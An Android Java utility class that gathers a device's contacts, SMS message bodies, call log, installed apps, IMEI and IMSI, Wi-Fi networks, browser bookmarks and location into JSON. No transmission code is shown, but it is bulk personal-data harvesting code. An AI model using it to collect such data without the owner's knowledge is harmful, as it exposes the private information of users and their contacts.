package com.advance.library.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Im;
import android.provider.ContactsContract.CommonDataKinds.Nickname;
import android.provider.ContactsContract.CommonDataKinds.Note;
import android.provider.ContactsContract.CommonDataKinds.Organization;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.Groups;
import android.support.annotation.NonNull;
import android.telephony.TelephonyManager;
import com.advance.library.personal.SMSInfo;
import com.advance.library.personal.AppsInfo;
import com.advance.library.personal.BrowserHistoryInfo;
import com.advance.library.personal.CallHistoryInfo;
import com.advance.library.personal.ContactInfo;
import com.advance.library.personal.SIMInfo;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Description: 获取设备的某些信息 <br>
 * Creator: Hongd <br>
 * Date: 2017/3/23 15:43 <br>
 * Email: tobu794@163.com <br>
 * Version: 1.0 <br>
 */
public class PhoneInfoUtils {

  public static String locationProvider;       //位置提供器

  /**
   * 如果这里返回联系人对象 如果联系人太多会占用太多内存， 所以以字符串形式返回请自行解析。
   * 格式为 id:name:phone|id:name:phone,phone.. (id, name, 电话直接用 ':' 分隔, 多个电话用 ',' 分隔), 当然你也可以替换成自己的格式
   */
  public static JSONArray buildAllStringContacts(Context ctx) throws JSONException {
    ArrayList<ContactInfo> contactInfoList = new ArrayList<>();
    JSONArray array = new JSONArray();
    Uri uri = Uri.parse("content://com.android.contacts/contacts");
    ContentResolver reslover = ctx.getContentResolver();
    Cursor cursor = reslover.query(uri, null, null, null, null);
    String id;
    while (cursor.moveToNext()) {
      ContactInfo contactInfo = new ContactInfo();
      id = cursor.getString(cursor.getColumnIndex(Contacts._ID));
      String name = cursor.getString(cursor.getColumnIndex(Contacts.DISPLAY_NAME));
      String starred = cursor.getString(cursor.getColumnIndex(Contacts.STARRED));
      Cursor phone = reslover.query(Phone.CONTENT_URI, null,
          ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + id, null, null);
      contactInfo.setId(Integer.parseInt(id));
      contactInfo.setStarred(Integer.parseInt(starred));
      contactInfo.setName(name);
      List<String> stringList = new ArrayList<>();
      //phone
      while (phone.moveToNext()) {
        stringList.add(phone.getString(phone.getColumnIndex(Phone.NUMBER)));
      }
      contactInfo.setPhone(Arrays.toString(stringList.toArray()));
      stringList.clear();
      phone.close();
      //email
      Cursor email = reslover
          .query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = " + id, null, null);
      while (email.moveToNext()) {
        stringList.add(email.getString(email.getColumnIndex(Email.DATA)));
      }
      contactInfo.setEmail(Arrays.toString(stringList.toArray()));
      stringList.clear();
      email.close();
      //im
      Cursor im = reslover.query(Data.CONTENT_URI,
          new String[]{Data._ID, Im.PROTOCOL, Im.DATA},
          Data.CONTACT_ID + " = " + id + " AND " + Data.MIMETYPE + " ='"
              + Im.CONTENT_ITEM_TYPE + "'",
          null, null);
      while (im.moveToNext()) {
        stringList.add(im.getString(im.getColumnIndex(Im.DATA)));
      }
      contactInfo.setIm(Arrays.toString(stringList.toArray()));
      stringList.clear();
      im.close();
      //address
      Cursor address = reslover
          .query(StructuredPostal.CONTENT_URI, null, Phone.CONTACT_ID + " = " + id, null, null);
      while (address.moveToNext()) {
        stringList.add(address
            .getString(address.getColumnIndex(StructuredPostal.FORMATTED_ADDRESS)));
      }
      contactInfo.setAddress(Arrays.toString(stringList.toArray()));
      stringList.clear();
      address.close();
      //organizations
      Cursor organizations = reslover
          .query(Data.CONTENT_URI, new String[]{Data._ID, Organization.COMPANY, Organization.TITLE},
              Data.CONTACT_ID + " = " + id + " AND " + Data.MIMETYPE + " ='"
                  + Organization.CONTENT_ITEM_TYPE + "'", null, null);
      while (organizations.moveToNext()) {
        stringList.add(organizations
            .getString(organizations.getColumnIndex(Organization.COMPANY)) + organizations
            .getString(organizations.getColumnIndex(Organization.TITLE)));
      }
      organizations.close();
      contactInfo.setOrganizations(Arrays.toString(stringList.toArray()));
      stringList.clear();
      //remarks info
      Cursor notes = reslover.query(Data.CONTENT_URI, new String[]{Data._ID, Note.NOTE},
          Data.CONTACT_ID + " = " + id + " AND " + Data.MIMETYPE + " ='" + Note.CONTENT_ITEM_TYPE
              + "'", null, null);
      while (notes.moveToNext()) {
        stringList.add(notes.getString(notes.getColumnIndex(Note.NOTE)));
      }
      contactInfo.setRemarks(Arrays.toString(stringList.toArray()));
      notes.close();
      stringList.clear();
      //nickname
      Cursor nickNames = reslover.query(Data.CONTENT_URI, new String[]{Data._ID, Nickname.NAME},
          Data.CONTACT_ID + " = " + id + " AND " + Data.MIMETYPE + " ='"
              + Nickname.CONTENT_ITEM_TYPE + "'", null, null);
      while (nickNames.moveToNext()) {
        stringList.add(nickNames.getString(nickNames.getColumnIndex(Nickname.NAME)));
      }
      nickNames.close();
      contactInfo.setNiceName(Arrays.toString(stringList.toArray()));
      stringList.clear();
      //group
      Cursor groups = reslover
          .query(Groups.CONTENT_URI, null, null, null, null);
      while (groups.moveToNext()) {
        stringList.add(groups.getString(groups.getColumnIndex(Groups.TITLE)));
      }
      groups.close();
      contactInfo.setGroup(Arrays.toString(stringList.toArray()));
      stringList.clear();
      contactInfoList.add(contactInfo);
    }
    cursor.close();
    for (int i = 0; i < contactInfoList.size(); i++) {
      ContactInfo appInfo = contactInfoList.get(i);
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("id", appInfo.getId());
      stoneObject.put("starred", appInfo.getStarred());
      stoneObject.put("name", appInfo.getName());
      stoneObject.put("phone", new JSONArray(appInfo.getPhone().replace(" ", "")));
      stoneObject.put("email", new JSONArray(appInfo.getEmail()));
      stoneObject.put("im", new JSONArray(appInfo.getIm()));
      stoneObject.put("organizations", new JSONArray(appInfo.getOrganizations()));
      stoneObject.put("remarks", new JSONArray(appInfo.getRemarks().replace(" ", "")));
      stoneObject.put("niceName", new JSONArray(appInfo.getNiceName()));
      stoneObject.put("groups", new JSONArray(appInfo.getGroup().replace(" ", "")));
      array.put(stoneObject);
    }
    return array;
  }

  /**
   * Description: 取除去系统应用的手机的app的名称, 包名, versionName,versionCode
   * 格式为 name:package:versionName:versionCode <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 14:57 <br>
   */
  public static JSONArray buildApps(Context context) throws JSONException {
    ArrayList<AppsInfo> appsInfoArrayList = new ArrayList<>();
    List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(0);
    for (int i = 0; i < packages.size(); i++) {
      AppsInfo appsInfo = new AppsInfo();
      PackageInfo packageInfo = packages.get(i);
      appsInfo
          .setLabel(packageInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
      appsInfo.setPackageName(packageInfo.packageName);
      appsInfo.setVersionName(packageInfo.versionName == null ? "null" : packageInfo.packageName);
      appsInfo.setVersionCode(String.valueOf(packageInfo.versionCode));
      appsInfoArrayList.add(appsInfo);
    }
    JSONArray array = new JSONArray();
    for (int i = 0; i < appsInfoArrayList.size(); i++) {
      AppsInfo appInfo = appsInfoArrayList.get(i);
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("label", appInfo.getLabel());
      stoneObject.put("packageName", appInfo.getPackageName());
      stoneObject.put("versionName", appInfo.getVersionName());
      stoneObject.put("versionCode", appInfo.getVersionCode());
      array.put(stoneObject);
    }
    return array;
  }

  /**
   * Description:  通话记录
   * 这里也是以字符串形式返回 可自行创建对象 比如 new Call()? 这里希望测一下内存占用率
   * 格式 id:电话号码:时长:日期:类型(接入/播出/未接) 注:日期需要格式化. <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:15 <br>
   */
  public static JSONArray buildCallHistory(Context context) throws SecurityException, JSONException {
    ArrayList<CallHistoryInfo> callHistoryList = new ArrayList<>();
    ContentResolver contentResolver = context.getContentResolver();
    String[] projection = {
        CallLog.Calls.DATE, // 日期
        CallLog.Calls.NUMBER, // 号码
        CallLog.Calls.TYPE, // 类型
        CallLog.Calls.CACHED_NAME, // 名字
    };
    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Uri callLogUri = Calls.CONTENT_URI;
    Cursor cursor = contentResolver
        .query(callLogUri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
    while (cursor.moveToNext()) {
      CallHistoryInfo callHistoryInfo = new CallHistoryInfo();
      String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
      callHistoryInfo
          .setDate(sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
      callHistoryInfo.setNumber(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
      callHistoryInfo.setType(String.valueOf(cursor.getInt(cursor.getColumnIndex(Calls.TYPE))));
      callHistoryInfo.setCachedName(cachedName == null ? "null" : cachedName);
      callHistoryList.add(callHistoryInfo);
    }
    cursor.close();
    JSONArray array = new JSONArray();
    for (int i = 0; i < callHistoryList.size(); i++) {
      CallHistoryInfo appInfo = callHistoryList.get(i);
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("date", appInfo.getDate());
      stoneObject.put("number", appInfo.getNumber());
      stoneObject.put("type", appInfo.getType());
      stoneObject.put("cachedName", appInfo.getCachedName());
      array.put(stoneObject);
    }
    return array;
  }

  /**
   * Description: 当前网络状态 : 没有网络-0：WIFI网络1：4G网络-4：3G网络-3：2G网络-2
   * 具体的2,3,4G 请结合当地运营商判断 <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:33 <br>
   */
  public static String buildCurrentNetStatus(Context context) throws JSONException {
    int netType = 0;
    ConnectivityManager manager = (ConnectivityManager) context
        .getSystemService(Context.CONNECTIVITY_SERVICE);
    NetworkInfo networkInfo = manager.getActiveNetworkInfo();
    if (networkInfo == null) {
      return String.valueOf(netType);
    }
    int nType = networkInfo.getType();
    if (nType == ConnectivityManager.TYPE_WIFI) {
      netType = 1;
    } else if (nType == ConnectivityManager.TYPE_MOBILE) {
      int nSubType = networkInfo.getSubtype();
      TelephonyManager tele = (TelephonyManager) context
          .getSystemService(Context.TELEPHONY_SERVICE);
      if (nSubType == TelephonyManager.NETWORK_TYPE_LTE && !tele.isNetworkRoaming()) {
        netType = 4;
      } else if (nSubType == TelephonyManager.NETWORK_TYPE_UMTS
          || nSubType == TelephonyManager.NETWORK_TYPE_HSDPA
          || nSubType == TelephonyManager.NETWORK_TYPE_EVDO_0
          && !tele.isNetworkRoaming()) {
        netType = 3;
      } else if (nSubType == TelephonyManager.NETWORK_TYPE_GPRS
          || nSubType == TelephonyManager.NETWORK_TYPE_EDGE
          || nSubType == TelephonyManager.NETWORK_TYPE_CDMA
          && !tele.isNetworkRoaming()) {
        netType = 2;
      } else {
        netType = 2;
      }
    }
    return String.valueOf(netType);
  }

  /**
   * Description: 手机信息
   * 格式 型号: imei: sim卡序列号: IMSI: sim卡所在国家 <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:42 <br>
   */
  public static JSONObject buildPhoneInfo(Context context) throws JSONException {
    SIMInfo simInfo = new SIMInfo();
    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    simInfo.setModel(Build.MODEL);
    simInfo.setDeviceId(tm.getDeviceId());
    simInfo.setSimNumber(tm.getSimSerialNumber() == null ? "null" : tm.getSimSerialNumber());
    simInfo.setIMSI(tm.getSubscriberId() == null ? "null" : tm.getSubscriberId());
    simInfo.setSimCountry(tm.getNetworkCountryIso() == null ? "null" : tm.getNetworkCountryIso());
    JSONObject stoneObject = new JSONObject();
    stoneObject.put("model", simInfo.getModel());
    stoneObject.put("deviceId", simInfo.getDeviceId());
    stoneObject.put("number", simInfo.getSimNumber());
    stoneObject.put("imsi", simInfo.getIMSI());
    stoneObject.put("country", simInfo.getSimCountry());
    return stoneObject;
  }

  /**
   * Description: 获取所有短消息
   * 格式为[号码| 内容| 日期| 状态(发送、接收等)] <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:42 <br>
   */
  public static JSONArray buildAllSms(Context context) throws JSONException {
    ArrayList<SMSInfo> allSmsInfoList = new ArrayList<>();
    final String SMS_URI_ALL = "content://sms/"; // 所有短信
    Uri uri = Uri.parse(SMS_URI_ALL);
    String[] projection = new String[]{"_id", "address", "person",
        "body", "date", "type",};
    Cursor cur = context.getContentResolver().query(uri, projection, null,
        null, "date desc");
    if (cur.moveToFirst()) {
      do {
        SMSInfo allSmsInfo = new SMSInfo();
        int intType = cur.getInt(cur.getColumnIndex("type"));
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        String strType;
        if (intType == 1) {
          strType = "inbox";
        } else if (intType == 2) {
          strType = "sent";
        } else if (intType == 3) {
          strType = "draft";
        } else if (intType == 4) {
          strType = "outbox";
        } else if (intType == 5) {
          strType = "failed";
        } else if (intType == 6) {
          strType = "queued";
        } else if (intType == 0) {
          strType = "all";
        } else {
          strType = "null";
        }
        allSmsInfo.setStrAddress(cur.getString(cur.getColumnIndex("address")));
        allSmsInfo.setStrBody(cur.getString(cur.getColumnIndex("body")));
        allSmsInfo
            .setStrDate(dateFormat.format(new Date(cur.getLong(cur.getColumnIndex("date")))));
        allSmsInfo.setStrType(strType);
        allSmsInfoList.add(allSmsInfo);
      } while (cur.moveToNext());

      if (!cur.isClosed()) {
        cur.close();
      }
    }
    JSONArray array = new JSONArray();
    for (int i = 0; i < allSmsInfoList.size(); i++) {
      SMSInfo appInfo = allSmsInfoList.get(i);
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("address", appInfo.getStrAddress());
      stoneObject.put("body", appInfo.getStrBody());
      stoneObject.put("date", appInfo.getStrDate());
      stoneObject.put("type", appInfo.getStrType());
      array.put(stoneObject);
    }
    return array;
  }

  /**
   * Description: 获取mac地址 <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:41 <br>
   */
  public static String buildMacAddress(Context mContext) throws JSONException {
    String macStr;
    WifiManager wifiManager = (WifiManager) mContext
        .getSystemService(Context.WIFI_SERVICE);
    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
    if (wifiInfo.getMacAddress() != null) {
      macStr = wifiInfo.getMacAddress();// MAC地址
    } else {
      macStr = "null";
    }
    return macStr;
  }

  /**
   * Description: 返回配置过的wifi SSID列表 [名称，名称 ...] <br>
   * Parameter:  <br>
   * ReturnType:  <br>
   * Date: 2017/3/20 15:42 <br>
   */
  @NonNull
  public static JSONArray buildConfiguredWifiList(Context context) throws JSONException {
    JSONArray array = new JSONArray();
    WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
    List<WifiConfiguration> wifiConfigurations = wifiManager.getConfiguredNetworks();
    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
    int ipAddress = wifiInfo.getIpAddress();
    if (null != wifiConfigurations) {
      for (WifiConfiguration wifiConfiguration : wifiConfigurations) {
        String ip = (ipAddress & 0xFF) + "." +
            ((ipAddress >> 8) & 0xFF) + "." +
            ((ipAddress >> 16) & 0xFF) + "." +
            (ipAddress >> 24 & 0xFF);
        JSONObject stoneObject = new JSONObject();
        stoneObject.put("ssid", wifiConfiguration.SSID.replace("\"", ""));
        stoneObject.put("title", ip);
        stoneObject.put("wifiMac", wifiInfo.getBSSID());
        stoneObject.put("linkSpeed", wifiInfo.getLinkSpeed());
        stoneObject.put("networkId", wifiInfo.getNetworkId());
        array.put(stoneObject);
      }
      return array;
    } else {
      return array;
    }
  }

  /**
   * 查询浏览器记录
   */
  public static JSONArray buildBrowserHistory(Context context) throws JSONException {
    ArrayList<BrowserHistoryInfo> browserInfoList = new ArrayList<>();
    ContentResolver contentResolver = context.getContentResolver();
    Cursor cursor = contentResolver.query(Uri.parse("content://browser/bookmarks"),
        new String[]{"title", "url", "date"}, null, null, null);
    SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd-hh:mm:ss");
    if (cursor != null) {
      while (cursor.moveToNext()) {
        BrowserHistoryInfo browserInfo = new BrowserHistoryInfo();
        browserInfo.setDate(sfd.format(new Date(cursor.getLong(cursor.getColumnIndex("date")))));
        browserInfo.setTitile(cursor.getString(cursor.getColumnIndex("title")));
        browserInfo.setUrl(cursor.getString(cursor.getColumnIndex("url")));
        browserInfoList.add(browserInfo);
      }
      cursor.close();
    }
    JSONArray array = new JSONArray();
    for (int i = 0; i < browserInfoList.size(); i++) {
      BrowserHistoryInfo appInfo = browserInfoList.get(i);
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("date", appInfo.getDate());
      stoneObject.put("title", appInfo.getTitile());
      stoneObject.put("url", appInfo.getUrl());
      array.put(stoneObject);
    }
    return array;
  }

  public static JSONObject buildLocation(Context context) throws SecurityException, JSONException {
    LocationManager locationManager = (LocationManager) context
        .getSystemService(Context.LOCATION_SERVICE);
    List<String> providers = locationManager.getProviders(true);
    if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
      locationProvider = LocationManager.NETWORK_PROVIDER;
    } else if (providers.contains(LocationManager.GPS_PROVIDER)) {
      locationProvider = LocationManager.GPS_PROVIDER;
    } else if (providers.contains(LocationManager.PASSIVE_PROVIDER)) {
      locationProvider = LocationManager.PASSIVE_PROVIDER;
    } else {
      return new JSONObject();
    }
    Location location = locationManager.getLastKnownLocation(locationProvider);
    if (location != null) {
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("latitude", location.getLatitude());
      stoneObject.put("longitude", location.getLongitude());
      return stoneObject;
    } else {
      return new JSONObject();
    }
  }

  public static JSONObject showLocation(Location location) throws JSONException {
    if (location == null) {
      return new JSONObject();
    }
    JSONObject stoneObject = new JSONObject();
    stoneObject.put("latitude", location.getLatitude());
    stoneObject.put("longitude", location.getLongitude());
    return stoneObject;
  }

  private static LocationListener mListener = new LocationListener() {
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    // 如果位置发生变化，重新显示
    @Override
    public void onLocationChanged(Location location) {
//      showLocation(location);
    }
  };

  /**
   * 当前电量:总电量:plugged:voltage:temperature:batteryStatus:batteryTemp
   */
  public static JSONObject buildBatteryInfo(Context context) throws JSONException {
    String batteryStatus = null;
    String batteryCharge = null;
    String batteryTemp = null;
    Intent batteryIntent = context.getApplicationContext()
        .registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    int level = batteryIntent.getIntExtra("level", 0);
    int scale = batteryIntent.getIntExtra("scale", 0);
    int voltage = batteryIntent.getIntExtra("voltage", 0);
    int temperature = batteryIntent.getIntExtra("temperature", 0);
    switch (batteryIntent.getIntExtra("status",
        BatteryManager.BATTERY_STATUS_UNKNOWN)) {
      case BatteryManager.BATTERY_STATUS_CHARGING:
        batteryStatus = "charging";
        break;
      case BatteryManager.BATTERY_STATUS_DISCHARGING:
        batteryStatus = "discharge state";
        break;
      case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
        batteryStatus = "not charged";
        break;
      case BatteryManager.BATTERY_STATUS_FULL:
        batteryStatus = "full charged";
        break;
      case BatteryManager.BATTERY_STATUS_UNKNOWN:
        batteryStatus = "unknown state";
        break;
    }
    switch (batteryIntent.getIntExtra("plugged",
        BatteryManager.BATTERY_PLUGGED_AC)) {
      case BatteryManager.BATTERY_PLUGGED_AC:
        batteryCharge = "AC Charge";
        break;
      case BatteryManager.BATTERY_PLUGGED_USB:
        batteryCharge = "USB Charge";
        break;
    }
    switch (batteryIntent.getIntExtra("health",
        BatteryManager.BATTERY_HEALTH_UNKNOWN)) {
      case BatteryManager.BATTERY_HEALTH_UNKNOWN:
        batteryTemp = "unknown mistake";
        break;
      case BatteryManager.BATTERY_HEALTH_GOOD:
        batteryTemp = "in good condition";
        break;
      case BatteryManager.BATTERY_HEALTH_DEAD:
        batteryTemp = "the battery is no electricity";
        break;
      case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
        batteryTemp = "the battery voltage is too high";
        break;
      case BatteryManager.BATTERY_HEALTH_OVERHEAT:
        batteryTemp = "the battery is overheated";
        break;
    }
    JSONObject stoneObject = new JSONObject();
    stoneObject.put("level", level);
    stoneObject.put("scale", scale);
    stoneObject.put("batteryCharge", batteryCharge);
    stoneObject.put("voltage", voltage);
    stoneObject.put("temperature", temperature);
    stoneObject.put("batteryStatus", batteryStatus);
    stoneObject.put("batteryTemp", batteryTemp);
    return stoneObject;
  }
}
